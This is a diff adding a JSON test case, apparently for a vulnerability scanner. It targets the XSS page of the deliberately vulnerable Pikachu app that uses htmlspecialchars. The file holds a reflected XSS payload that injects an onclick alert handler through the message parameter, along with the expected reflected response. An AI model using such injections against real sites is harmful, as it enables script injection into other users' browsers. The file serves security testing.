@@ -1,0 +1,28 @@
+
+
+{
+    "name": "pikachu",
+    "vuln": "xss之htmlspecialchars",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "1",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "GET",
+                "path": "/vul/xss/xss_02.php?message=%27+onclick%3D%27alert%28%22xss%22%29&submit=submit",
+                "cookie": "",
+                "requestheader": "",
+                "requestbody": ""
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "<a href='' onclick='alert(&quot;xss&quot;)'>"
+            }
+        }
+    }
+}
